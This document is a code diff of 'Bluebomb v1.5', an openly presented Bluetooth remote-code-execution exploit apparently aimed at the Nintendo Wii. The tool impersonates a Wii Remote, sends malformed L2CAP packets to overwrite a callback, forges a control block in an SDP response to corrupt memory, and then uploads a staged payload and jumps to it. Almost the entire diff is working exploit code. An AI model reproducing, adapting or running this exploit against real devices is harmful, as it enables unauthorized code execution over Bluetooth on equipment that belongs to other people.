@@ -1,4 +1,4 @@
-/*  Copyright 2019  Dexter Gerig  <dexgerig@gmail.com>
+/*  Copyright 2019-2020  Dexter Gerig  <dexgerig@gmail.com>
     
     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
@@ -16,8 +16,8 @@
 
 #include <stdio.h>
 #include <stdlib.h>
-#include <sys/types.h>
 #include <sys/socket.h>
+#include <sys/types.h>
 #include <sys/uio.h>
 #include <errno.h>
 #include <unistd.h>
@@ -28,11 +28,10 @@
 #include <bluetooth/hci.h>
 #include <bluetooth/l2cap.h>
 
-#include "stream_macros.h"
+#include "libminibt.h"
+#include "stage0_bin.h"
 
-uint32_t SDP_CB;
-uint32_t L2CB;
-uint32_t SWITCH_ADDR;
+#include "stream_macros.h"
 
 void* get_file(char *name, int *out_len) {
 	FILE *f = fopen(name, "rb");
@@ -62,281 +61,6 @@ void* get_file(char *name, int *out_len) {
 	return data;
 }
 
-static inline void hci_filter_clear(struct hci_filter *f)
-{
-	memset(f, 0, sizeof(*f));
-}
-static inline void hci_filter_all_ptypes(struct hci_filter *f)
-{
-	memset((void *) &f->type_mask, 0xff, sizeof(f->type_mask));
-}
-static inline void hci_filter_all_events(struct hci_filter *f)
-{
-	memset((void *) f->event_mask, 0xff, sizeof(f->event_mask));
-}
-
-int hci_open_dev(int dev_id)
-{
-	struct sockaddr_hci a;
-	int dd, err;
-
-	/* Check for valid device id */
-	if (dev_id < 0) {
-		errno = ENODEV;
-		return -1;
-	}
-
-	/* Create HCI socket */
-	dd = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
-	if (dd < 0)
-		return dd;
-	
-	/* Set filters */
-	struct hci_filter flt;
-	hci_filter_clear(&flt);
-	hci_filter_all_ptypes(&flt);
-	hci_filter_all_events(&flt);
-	if (setsockopt(dd, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) < 0) {
-		printf("Can't set filter\n");
-		goto failed;
-	}
-
-	/* Bind socket to the HCI device */
-	memset(&a, 0, sizeof(a));
-	a.hci_family = AF_BLUETOOTH;
-	a.hci_dev = dev_id;
-	if (bind(dd, (struct sockaddr *) &a, sizeof(a)) < 0) {
-		printf("Can't bind to socket\n");
-		goto failed;
-	}
-
-	return dd;
-
-failed:
-	err = errno;
-	close(dd);
-	errno = err;
-
-	return -1;
-}
-
-int get_device_handle(int raw_sock) {
-	uint8_t *buf = malloc(HCI_MAX_FRAME_SIZE);
-	ssize_t ret = 0;
-	
-	// Only process 100 packets at max to prevent an infinite loop
-	for (int i = 0; i < 100; i++) {
-		do {
-			ret = recv(raw_sock, buf, HCI_MAX_FRAME_SIZE, MSG_DONTWAIT);
-		} while (ret == EINTR);
-		
-		if (ret == EAGAIN || ret == EWOULDBLOCK)
-			continue;
-		
-		if (buf[0] != HCI_EVENT_PKT)
-			continue;
-		
-		if (buf[1] != 0x03) // HCI_CONNECTION_COMPLETE_EVENT
-			continue;
-		
-		int handle = (buf[5] * 0x100) | buf[4];
-		free(buf);
-		return handle;
-	}
-	
-	free(buf);
-	return -1;
-}
-
-int hci_send_cmd(int dd, uint16_t ogf, uint16_t ocf, void *param, uint8_t plen)
-{
-	uint8_t type = HCI_COMMAND_PKT;
-	hci_command_hdr hc;
-	struct iovec iv[3];
-	int ivn;
-
-	hc.opcode = htobs(cmd_opcode_pack(ogf, ocf));
-	hc.plen = plen;
-
-	iv[0].iov_base = &type;
-	iv[0].iov_len  = 1;
-	iv[1].iov_base = &hc;
-	iv[1].iov_len  = HCI_COMMAND_HDR_SIZE;
-	ivn = 2;
-
-	if (plen) {
-		iv[2].iov_base = param;
-		iv[2].iov_len  = plen;
-		ivn = 3;
-	}
-
-	while (writev(dd, iv, ivn) < 0) {
-		if (errno == EAGAIN || errno == EINTR)
-			continue;
-		return -1;
-	}
-	return 0;
-}
-
-#define MTU 0x00F0 // Just to be on the safe side
-
-int hci_send_acl(int dd, uint16_t handle, uint8_t pb_bc, void *param, uint16_t dlen)
-{
-	if (dlen > MTU) {
-		printf("hci_send_acl: dlen bigger than MTU\n");
-		return -1;
-	}
-	
-	uint8_t type = HCI_ACLDATA_PKT;
-	hci_acl_hdr ha;
-	struct iovec iv[3];
-	int ivn;
-
-	ha.handle = htobs(acl_handle_pack(handle, pb_bc));
-	ha.dlen = htobs(dlen);
-
-	iv[0].iov_base = &type;
-	iv[0].iov_len  = 1;
-	iv[1].iov_base = &ha;
-	iv[1].iov_len  = HCI_ACL_HDR_SIZE;
-	ivn = 2;
-
-	if (dlen) {
-		iv[2].iov_base = param;
-		iv[2].iov_len  = dlen;
-		ivn = 3;
-	}
-
-	while (writev(dd, iv, ivn) < 0) {
-		if (errno == EAGAIN || errno == EINTR)
-			continue;
-		return -1;
-	}
-	return 0;
-}
-
-// Use this, it fragments the packet for you.
-// TODO: Actually test this first
-int send_acl_packet(int dd, uint16_t handle, void* param, int len) {
-	int ret = 0;
-	
-	if (dd < 0) {
-		printf("send_acl_packet: Invalid socket\n");
-		return -1;
-	}
-	
-	if (param == NULL || len == 0) {
-		printf("send_acl_packet: No data to send\n");
-		return -1;
-	}
-	
-	if (len < 0 || len > 0xFFFF) {
-		printf("send_acl_packet: Invalid length\n");
-		return -1;
-	}
-	
-	if (len <= MTU) {
-		return hci_send_acl(dd, handle, ACL_START, param, len);
-	}
-	
-	ret = hci_send_acl(dd, handle, ACL_START, param, MTU);
-	if (ret)
-		return ret;
-	
-	int rem = len - MTU;
-	while (rem > MTU) {
-		int ret = hci_send_acl(dd, handle, ACL_CONT, param, MTU);
-		if (ret)
-			return ret;
-		rem -= MTU;
-	}
-	
-	if (rem)
-		ret = hci_send_acl(dd, handle, ACL_CONT, param, rem);
-	
-	return ret;
-}
-
-struct l2cap_payload {
-	uint8_t opcode;
-	uint8_t id;
-	uint16_t length;
-	uint8_t data[];
-} __attribute__ ((packed));
-#define L2CAP_PAYLOAD_LENGTH 4
-
-struct l2cap_packet {
-	uint16_t length;
-	uint16_t cid;
-	struct l2cap_payload payload;
-} __attribute__ ((packed));
-#define L2CAP_HEADER_LENGTH 4
-#define L2CAP_OVERHEAD 8
-
-int await_response(int raw_sock, uint16_t await_msg) {
-	uint8_t *buf = malloc(HCI_MAX_FRAME_SIZE);
-	ssize_t ret = 0;
-	
-	while (1) {
-		do {
-			ret = recv(raw_sock, buf, HCI_MAX_FRAME_SIZE, 0);
-		} while (ret == EINTR || ret == EAGAIN);
-		
-		if (ret < 0) {
-			printf("recv failed: %ld\n", ret);
-			free(buf);
-			return -1;
-		}
-		
-		if (buf[0] != HCI_ACLDATA_PKT)
-			continue;
-		
-		hci_acl_hdr *hdr = (hci_acl_hdr*)&buf[1];
-		int size_left = btohs(hdr->dlen);
-		uint8_t *l2_head = &buf[1 + sizeof(hci_acl_hdr)];
-		while (size_left > 0) {
-			struct l2cap_packet *pkt = (struct l2cap_packet*)l2_head;
-			int pkt_len = L2CAP_HEADER_LENGTH + le16toh(pkt->length);
-			size_left -= pkt_len;
-			l2_head += pkt_len;
-			
-			uint8_t *payload_head = (uint8_t*)&pkt->payload;
-			while (pkt_len > 0) {
-				struct l2cap_payload *payload = (struct l2cap_payload*)payload_head;
-				int payload_len = L2CAP_PAYLOAD_LENGTH + le16toh(payload->length);
-				pkt_len -= payload_len;
-				payload_head += payload_len;
-				
-				if (payload->opcode != 0x03) // L2CAP_CONNECTION_RESPONSE
-					continue;
-				
-				uint8_t *conn_response = payload->data;
-				uint16_t dest_cid;
-				uint16_t src_cid;
-				uint16_t result;
-				uint16_t status;
-				
-				STREAM_TO_UINT16(dest_cid, conn_response);
-				STREAM_TO_UINT16(src_cid, conn_response);
-				STREAM_TO_UINT16(result, conn_response);
-				STREAM_TO_UINT16(status, conn_response);
-				
-				// shutup gcc
-				(void)dest_cid;
-				(void)src_cid;
-				(void)result;
-				(void)status;
-				
-				if (result != await_msg)
-					continue;
-				
-				free(buf);
-				return 0;
-			}
-		}
-	}
-}
-
 void do_hax(int raw_sock, int device_handle) {
 	// Chain these packets together so things are more deterministic.
 	int bad_packet_len = L2CAP_PAYLOAD_LENGTH + 6;
@@ -348,7 +72,7 @@ void do_hax(int raw_sock, int device_handle) {
 	hax->length = htole16(bad_packet_len + empty_packet_len);
 	hax->cid = htole16(0x0001);
 	
-	printf("Overwriting switch case 0xb in process_l2cap_cmd.\n");
+	printf("Overwriting callback in switch case 0x9.\n");
 	
 	p->opcode = 0x01; // L2CAP_CMD_REJECT
 	p->id = 0x00;
@@ -361,16 +85,16 @@ void do_hax(int raw_sock, int device_handle) {
 	
 	p = (struct l2cap_payload*)((uint8_t*)p + L2CAP_PAYLOAD_LENGTH + le16toh(p->length));
 	
-	printf("Trigger switch statement 0xb.\n");
+	printf("Trigger switch statement 0x9.\n");
 	
-	p->opcode = 0x0b; // L2CAP_CMD_INFO_RSP which is now a jump to our payload
+	p->opcode = 0x09; // L2CAP_CMD_ECHO_RSP which will trigger a callback to our payload
 	p->id = 0x00;
 	p->length = htole16(0x0000);
 	
 	p = (struct l2cap_payload*)((uint8_t*)p + L2CAP_PAYLOAD_LENGTH + le16toh(p->length));
 	
 	printf("Sending hax\n");
-	hci_send_acl(raw_sock, device_handle, ACL_START, hax, total_length);
+	send_acl_packet(raw_sock, device_handle, hax, total_length);
 	free(hax);
 	
 	printf("Awaiting response from stage0\n");
@@ -396,8 +120,9 @@ struct ccb {
 // TODO: Figure out the real MTU instead of choosing semi-random numbers
 #define SDP_MTU 0xD0
 
-void send_sdp_service_response(int fd) {
+void send_sdp_service_response(uint32_t L2CB, int fd) {
 	uint16_t required_size = 1 + 2 + 2 + 2 + 2 + (0x15 * 4) + 1;
+	uint32_t SDP_CB = L2CB + 0xc00;
 	
 	uint8_t *response = malloc(required_size);
 	memset(response, 0x00, required_size);
@@ -408,7 +133,7 @@ void send_sdp_service_response(int fd) {
 	fake_ccb.in_use = 1;
 	fake_ccb.chnl_state = htobe32(0x00000002); // CST_TERM_W4_SEC_COMP
 	fake_ccb.p_next_ccb = htobe32(SDP_CB + 0x68);
-	fake_ccb.p_prev_ccb = htobe32(SWITCH_ADDR - 8);
+	fake_ccb.p_prev_ccb = htobe32(L2CB + 8 + 0x54 - 8);
 	fake_ccb.p_lcb = htobe32(L2CB + 0x8);
 	fake_ccb.local_cid = htobe16(0x0000);
 	fake_ccb.remote_cid = htobe16(0x0000); // Needs to match the rcid sent in the packet that uses the faked ccb.
@@ -432,7 +157,6 @@ void send_sdp_service_response(int fd) {
 }
 
 void send_sdp_attribute_response(int fd, void* payload, int len) {
-	
 	uint16_t required_size = 1 + 2 + 2 + 2 + 1 + 1 + 1 + 2 + 1 + SDP_MTU + 1;
 	
 	uint8_t *response = malloc(required_size);
@@ -480,7 +204,7 @@ void send_sdp_attribute_response(int fd, void* payload, int len) {
 	return;
 }
 
-#define PAYLOAD_MTU 0xD0
+#define PAYLOAD_MTU 0x200
 
 void upload_payload(int fd, int device_handle, void* data, uint32_t size) {
 	int segments = size / PAYLOAD_MTU;
@@ -497,7 +221,7 @@ void upload_payload(int fd, int device_handle, void* data, uint32_t size) {
 		upload->length = htole16(upload_packet_len);
 		upload->cid = htole16(0x0001);
 		
-		p->opcode = 0x0B; // L2CAP_CMD_UPLOAD_PAYLOAD
+		p->opcode = 0x09; // L2CAP_CMD_UPLOAD_PAYLOAD
 		p->id = 0x00; // CONTINUE_REQUEST
 		p->length = htole16(PAYLOAD_MTU);
 		
@@ -505,7 +229,7 @@ void upload_payload(int fd, int device_handle, void* data, uint32_t size) {
 		
 		printf("\r%d / %d", i * PAYLOAD_MTU, size);
 		fflush(stdout);
-		hci_send_acl(fd, device_handle, ACL_START, upload, total_length);
+		send_acl_packet(fd, device_handle, upload, total_length);
 		free(upload);
 		ret = await_response(fd, 0x4744);
 		if (ret < 0) {
@@ -524,7 +248,7 @@ void upload_payload(int fd, int device_handle, void* data, uint32_t size) {
 		upload->length = htole16(upload_packet_len);
 		upload->cid = htole16(0x0001);
 		
-		p->opcode = 0x0B; // L2CAP_CMD_UPLOAD_PAYLOAD
+		p->opcode = 0x09; // L2CAP_CMD_UPLOAD_PAYLOAD
 		p->id = 0x00; // CONTINUE_REQUEST
 		p->length = htole16(remainder);
 		
@@ -532,7 +256,7 @@ void upload_payload(int fd, int device_handle, void* data, uint32_t size) {
 		
 		printf("\r%d / %d", size, size);
 		fflush(stdout);
-		hci_send_acl(fd, device_handle, ACL_START, upload, total_length);
+		send_acl_packet(fd, device_handle, upload, total_length);
 		free(upload);
 		ret = await_response(fd, 0x4744);
 		if (ret < 0) {
@@ -552,36 +276,76 @@ void jump_payload(int fd, int device_handle) {
 	jump->length = htole16(jump_packet_len);
 	jump->cid = htole16(0x0001);
 	
-	p->opcode = 0x0B; // L2CAP_CMD_UPLOAD_PAYLOAD
+	p->opcode = 0x09; // L2CAP_CMD_UPLOAD_PAYLOAD
 	p->id = 0x01; // JUMP_PAYLOAD
 	p->length = htole16(0x0000);
 	
-	hci_send_acl(fd, device_handle, ACL_START, jump, total_length);
+	send_acl_packet(fd, device_handle, jump, total_length);
 	free(jump);
 }
 
-int set_device_local_name(int fd, char *name) {
-	int name_len = strlen(name) + 1;
+int init_bt(int raw_sock, int ctrl_sock, int hci_dev) {
+	int err = 0;
 	
-	if (name_len > 248) {
-		printf("Device name too long\n");
-		return -1;
+	for (int i = 0; i < 3; i++) {
+		printf("Powering on device\n");
+		if ((err = mgmt_power_device(ctrl_sock, hci_dev, 1)) != 0) {
+			printf("Failed to power on device: %d\n", err);
+			goto try_again;
+		}
+		
+		printf("Setting device connectable\n");
+		if ((err = mgmt_set_connectable(ctrl_sock, hci_dev, 1)) != 0) {
+			printf("Failed to make device connectable: %d\n", err);
+			goto try_again;
+		}
+		
+		printf("Setting device bondable\n");
+		if ((err = mgmt_set_bondable(ctrl_sock, hci_dev, 1)) != 0) {
+			printf("Failed to make device bondable: %d\n", err);
+			goto try_again;
+		}
+		
+		printf("Setting device discoverable\n");
+		if ((err = mgmt_set_discoverable(ctrl_sock, hci_dev, 1, 0x7fff)) != 0) {
+			printf("Failed to make device discoverable: %d\n", err);
+			goto try_again;
+		}
+		
+		printf("Setting device local name\n");
+		if ((err = mgmt_set_local_name(ctrl_sock, hci_dev, "Nintendo RVL-CNT-01")) != 0) {
+			printf("Failed to set device local name: %d\n", err);
+			goto try_again;
+		}
+		
+		printf("Setting IAC LAP\n");
+		uint32_t lap = 0x9e8b00; // Limited Inquiry Access Code
+		if ((err = bt_set_iac_lap(raw_sock, 1, &lap)) != 0) {
+			printf("Failed to set IAC LAP: %d %s\n", err, err < 0 ? strerror(errno) : "");
+			goto try_again;
+		}
+		
+		printf("Enabling Inquiry+Page scanning\n");
+		if ((err = bt_set_device_scan(raw_sock, 3)) != 0) {
+			printf("Failed to enable scanning: %d %s\n", err, err < 0 ? strerror(errno) : "");
+			goto try_again;
+		}
+		
+		return 0;
+		
+		try_again:
+		sleep(3); // Give it some time for the device to stablize
 	}
 	
-	char padded_local_name[248] = {0};
-	memcpy(padded_local_name, name, name_len);
-	
-	hci_send_cmd(fd, 0x0003, 0x0013, padded_local_name, 248); // HCI_Write_Local_Name
-	
-	return 0;
+	return -1;
 }
 
 int main(int argc, char *argv[]) {
-	(void)argc; // Shutup gcc
-	(void)argv;
+	int hci_dev = 0;
 	int l2cap_sock = -1;
 	int con = -1;
 	int raw_sock = -1;
+	int ctrl_sock = -1;
 	struct sockaddr_l2 l2addr;
 	char *stage0_name = NULL;
 	int stage0_length = 0;
@@ -589,10 +353,21 @@ int main(int argc, char *argv[]) {
 	char *stage1_name = NULL;
 	int stage1_length = 0;
 	void* stage1 = NULL;
+	uint32_t payload_addr = 0x81780000; // 512K before the end of mem 1
+	uint32_t L2CB = 0;
 	
-	int hci_device = 0;
+	printf("Bluebomb v1.5\n");
+	
+	if (argc != 3 && argc != 4) {
+		printf("Usage:\n");
+		printf("\t%s [hci-device-number] <target-app-bin> <stage1-bin>\n", argv[0]);
+		printf("\t[] = optional\n");
+		printf("\t<> = required\n");
+		return 0;
+	}
+	
 	if (argc == 4) {
-		hci_device = (int)strtol(argv[1], NULL, 16);
+		hci_dev = (int)strtol(argv[1], NULL, 10);
 		stage0_name = argv[2];
 		stage1_name = argv[3];
 	} else {
@@ -606,25 +381,42 @@ int main(int argc, char *argv[]) {
 		goto err_out;
 	}
 	
-	SDP_CB = be32toh(*((uint32_t*)stage0 + 0));
-	L2CB = be32toh(*((uint32_t*)stage0 + 1));
-	SWITCH_ADDR = be32toh(*((uint32_t*)stage0 + 2));
-	
-	printf("App settings:\n");
-	printf("\tSDP_CB: 0x%08X\n", SDP_CB);
-	printf("\tL2CB: 0x%08X\n", L2CB);
-	printf("\tSWITCH_ADDR: 0x%08X\n", SWITCH_ADDR);
-	
-	printf("Opening device hci%d\n", hci_device);
-	raw_sock = hci_open_dev(hci_device);
-	if (raw_sock < 0) {
-		printf("Failed to open device\n");
+	if (stage0_length != 4) {
+		printf("Invalid payload file\n");
+		printf("Please use the ones from the 1.5 release, not the old ones\n");
 		goto err_out;
 	}
 	
-	printf("Setting device local name\n");
-	if (set_device_local_name(raw_sock, "Nintendo RVL-CNT-01") < 0) {
-		printf("Failed to set device local name\n");
+	L2CB = be32toh(*(uint32_t*)stage0);
+	
+	if (L2CB >= 0x81000000) {
+		printf("Detected system menu\n");
+		payload_addr = 0x80004000;
+	}
+	
+	printf("App settings:\n");
+	printf("\tL2CB: 0x%08X\n", L2CB);
+	printf("\tpayload_addr: 0x%08X\n", payload_addr);
+	
+	*(uint32_t*)(stage0_bin + 0x8) = htobe32(payload_addr);
+	
+	printf("Opening raw handle for device hci%d\n", hci_dev);
+	raw_sock = hci_open_raw_dev(hci_dev);
+	if (raw_sock < 0) {
+		printf("Failed to open: %s\n", strerror(errno));
+		goto err_out;
+	}
+	
+	printf("Opening control handle for device hci%d\n", hci_dev);
+	ctrl_sock = hci_open_control_dev(hci_dev);
+	if (ctrl_sock < 0) {
+		printf("Failed to open: %s\n", strerror(errno));
+		goto err_out;
+	}
+	
+	printf("Configuring device\n");
+	if (init_bt(raw_sock, ctrl_sock, hci_dev) < 0) {
+		printf("Failed to configure device\n");
 		goto err_out;
 	}
 	
@@ -645,7 +437,7 @@ int main(int argc, char *argv[]) {
 	}
 	
 	if (listen(l2cap_sock, 5) < 0) {
-		printf("Error listening to l2cap socket: %s", strerror(errno));
+		printf("Error listening to l2cap socket: %s\n", strerror(errno));
 		goto err_out;
 	}
 	
@@ -667,11 +459,13 @@ int main(int argc, char *argv[]) {
 		goto err_out;
 	}
 	
+	//TODO: Leak shit
+	
 	printf("Sending SDP service response\n");
-	send_sdp_service_response(con);
+	send_sdp_service_response(L2CB, con);
 	
 	printf("Sending SDP attribute response\n");
-	send_sdp_attribute_response(con, stage0 + 0xc, stage0_length - 0xc);
+	send_sdp_attribute_response(con, stage0_bin, stage0_bin_len);
 	
 	printf("Sleeping for 5 seconds to try to make sure stage0 is flushed\n");
 	sleep(5);
@@ -699,6 +493,8 @@ err_out:
 		close(con);
 	if (raw_sock >= 0)
 		close(raw_sock);
+	if (ctrl_sock >= 0)
+		close(ctrl_sock);
 	
 	return 0;
 }
